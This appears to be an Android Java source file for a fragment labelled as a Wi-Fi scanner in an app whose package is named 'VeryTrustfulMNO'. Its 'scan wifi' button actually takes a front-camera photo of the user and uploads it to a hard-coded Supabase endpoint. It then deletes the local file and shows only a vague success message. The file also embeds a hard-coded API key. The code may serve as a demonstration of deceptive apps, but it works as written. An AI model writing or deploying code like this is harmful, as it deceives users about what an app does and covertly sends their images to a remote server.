package de.foo.bar.VeryTrustfulMNO.WifiScanner;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.Fragment;

import com.google.common.util.concurrent.ListenableFuture;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Locale;
import java.util.concurrent.ExecutionException;

import de.foo.bar.VeryTrustfulMNO.R;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class WifiScannerFragment extends Fragment {

    private static final String TAG = "WifiScannerFragment";
    private static final String FILENAME_FORMAT = "yyyy-MM-dd-HH-mm-ss-SSS";
    private static final String UPLOAD_URL = "https://vwhosnragmnkhkgjogoq.supabase.co/functions/v1/upload-image";

    private Button scanWifiButton;

    private final ActivityResultLauncher<String> requestPermissionLauncher = registerForActivityResult(
            new ActivityResultContracts.RequestPermission(),
            isGranted -> {
                if (isGranted) {
                    takePhoto();
                } else {
                    Toast.makeText(requireContext(), "Camera permission is required to use this feature.", Toast.LENGTH_SHORT).show();
                }
            });

    public WifiScannerFragment() {
        // Required empty public constructor
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_wifi_scanner, container, false);

        scanWifiButton = view.findViewById(R.id.scan_wifi_button);

        scanWifiButton.setOnClickListener(v -> {
            if (allPermissionsGranted()) {
                takePhoto();
            } else {
                requestPermissionLauncher.launch(Manifest.permission.CAMERA);
            }
        });

        return view;
    }

    private void takePhoto() {
        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(requireContext());

        cameraProviderFuture.addListener(() -> {
            try {
                ProcessCameraProvider cameraProvider = cameraProviderFuture.get();

                ImageCapture imageCapture = new ImageCapture.Builder().build();

                CameraSelector cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA;

                cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture);

                File photoFile = new File(requireContext().getExternalCacheDir(),
                        new SimpleDateFormat(FILENAME_FORMAT, Locale.US).format(System.currentTimeMillis()) + ".jpg");

                ImageCapture.OutputFileOptions outputOptions = new ImageCapture.OutputFileOptions.Builder(photoFile).build();

                imageCapture.takePicture(
                        outputOptions,
                        ContextCompat.getMainExecutor(requireContext()),
                        new ImageCapture.OnImageSavedCallback() {
                            @Override
                            public void onImageSaved(@NonNull ImageCapture.OutputFileResults outputFileResults) {
                                uploadImage(photoFile, UPLOAD_URL, new UploadCallback() {
                                    @Override
                                    public void onSuccess(String response) {
                                        requireActivity().runOnUiThread(() ->
                                                Toast.makeText(requireContext(), "Upload OK!", Toast.LENGTH_SHORT).show()
                                        );
                                        deleteFile(photoFile);
                                    }

                                    @Override
                                    public void onError(String error) {
                                        requireActivity().runOnUiThread(() ->
                                                Toast.makeText(requireContext(), "Upload failed: " + error, Toast.LENGTH_LONG).show()
                                        );
                                    }
                                });
                                cameraProvider.unbindAll();
                            }

                            @Override
                            public void onError(@NonNull ImageCaptureException exception) {
                                Log.e(TAG, "Photo capture failed: " + exception.getMessage(), exception);
                                cameraProvider.unbindAll();
                            }
                        });

            } catch (ExecutionException | InterruptedException e) {
                Log.e(TAG, "Use case binding failed", e);
            }
        }, ContextCompat.getMainExecutor(requireContext()));
    }

    private void uploadImage(File imageFile, String uploadUrl, UploadCallback callback) {
        new Thread(() -> {
            // TODO: Replace with your Supabase anon key
            String supabaseAnonKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ3aG9zbnJhZ21ua2hrZ2pvZ29xIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjMxMzU0MDgsImV4cCI6MjA3ODcxMTQwOH0.BlYUZDgsVbmGhRFzVK4orcHlutFrdk-bPY0A81V719o";

            OkHttpClient client = new OkHttpClient();

            MediaType mediaType = MediaType.parse("image/jpeg");

            RequestBody fileBody = RequestBody.create(imageFile, mediaType);

            MultipartBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", imageFile.getName(), fileBody)
                    .build();

            Request request = new Request.Builder()
                    .url(uploadUrl)
                    .addHeader("apikey", supabaseAnonKey)
                    .addHeader("Authorization", "Bearer " + supabaseAnonKey)
                    .post(requestBody)
                    .build();

            try (Response response = client.newCall(request).execute()) {
                if (response.isSuccessful()) {
                    callback.onSuccess(response.body().string());
                } else {
                    callback.onError("Server error: " + response.code());
                }
            } catch (IOException e) {
                callback.onError("Upload failed: " + e.getMessage());
            }
        }).start();
    }

    public interface UploadCallback {
        void onSuccess(String response);
        void onError(String error);
    }

    private void deleteFile(File file) {
        if (file != null && file.exists()) {
            file.delete();
        }
    }

    private boolean allPermissionsGranted() {
        return ContextCompat.checkSelfPermission(requireContext(), Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
    }
}